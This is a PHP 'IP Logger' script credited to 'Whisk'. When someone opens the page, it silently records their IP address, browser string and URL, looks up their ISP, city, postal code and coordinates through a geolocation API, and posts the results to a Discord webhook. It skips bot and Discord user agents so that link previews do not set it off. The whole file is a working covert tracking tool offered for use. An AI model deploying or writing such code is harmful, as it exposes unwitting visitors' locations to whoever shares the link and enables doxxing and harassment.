<?php

$Webhook    = "https://discord.com/api/webhooks/"; //Webhook here
$WebhookTag = "Ip Logger"; //Name this whatever you want
$WebhookAvatar = "https://vgy.me/GQe9bJ.png"; //Change this to your the avatar you prefer
$DEmbedColor = "FFFFFF"; //Change the color of the Discord Embed must be in hex "FFFFFF"

//                        Dont Edit Unless You Know What You're Doing!
//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\
//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\

$IP       = $_SERVER['REMOTE_ADDR'];
$Browser  = $_SERVER['HTTP_USER_AGENT'];
$URL = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

if(preg_match('/bot|Discord|robot|curl|spider|crawler|Cloudflare-SSLDetector|^$/i', $Browser)) {
    exit();
}

$Curl = curl_init("http://ip-api.com/json/$IP");
curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
$Info = json_decode(curl_exec($Curl)); 
curl_close($Curl);

$ISP = $Info->isp;
$Status = $Info->status;
$Country = $Info->country;
$countryCode = $Info->countryCode;
$Region = $Info->regionName;
$City = $Info->city;
$Tz = $Info->timezone;
$Zip = $Info->zip;
$COORD = "$Info->lat, $Info->lon"; 
$flag = "https://www.countryflags.io/{$countryCode}/flat/64.png";
$timestamp = date("Y-m-d H:i:s");


$hookObject = json_encode([ // Discord Embed Message
    'username'   => "$WebhookTag" , 
    'avatar_url' => "$WebhookAvatar",
    "embeds" => [
        /*
         * Our first embed
         */
        [
            "title" => "Ip Logger",
            
            // The type of your embed, will ALWAYS be "rich"
            "type" => "rich",
            
            /* A timestamp to be displayed below the embed, IE for when an an article was posted
             * This must be formatted as ISO8601
             */
            "timestamp" => "$timestamp",
            
            // The integer color to be used on the left side of the embed
            "color" => hexdec( "$DEmbedColor" ),
            
            // Footer object
            "footer" => [
                "text" => "$WebhookTag | IP Logger",
                "icon_url" => "$WebhookAvatar"
            ],
            "thumbnail" => [
                "url" => "$flag"
            ],
            // Author object
            "author" => [
                "name" => "Made By Whisk | github.com/Wh7sk",
                "url" => "https://github.com/Wh7sk"
            ],
            // Field array of objects
            "fields" => [
                // Field 1
                [
                    "name" => "URL Header Logged",
                    "value" => "$URL",
                    "inline" => false
                ],
                [
                    "name" => "IP",
                    "value" => "$IP",
                    "inline" => true
                ],
                [
                    "name" => "ISP",
                    "value" => "$ISP",
                    "inline" => true
                ],
                [
                    "name" => "Status",
                    "value" => "$Status",
                    "inline" => true
                ],
                [
                    "name" => "Browser",
                    "value" => "$Browser",
                    "inline" => false
                ],
                [
                    "name" => "Country",
                    "value" => "$Country",
                    "inline" => true
                ],
                [
                    "name" => "Region",
                    "value" => "$Region",
                    "inline" => true
                ],
                [
                    "name" => "City",
                    "value" => "$City",
                    "inline" => true
                ],
                [
                    "name" => "Timezone",
                    "value" => "$Tz",
                    "inline" => true
                ],
                [
                    "name" => "Postal/Zip",
                    "value" => "$Zip",
                    "inline" => true
                ],
                [
                    "name" => "Coordinates",
                    "value" => "$COORD",
                    "inline" => true
                ],
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init();

curl_setopt_array( $ch, [
    CURLOPT_URL => $Webhook,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);

$response = curl_exec( $ch );
curl_close( $ch );

?>
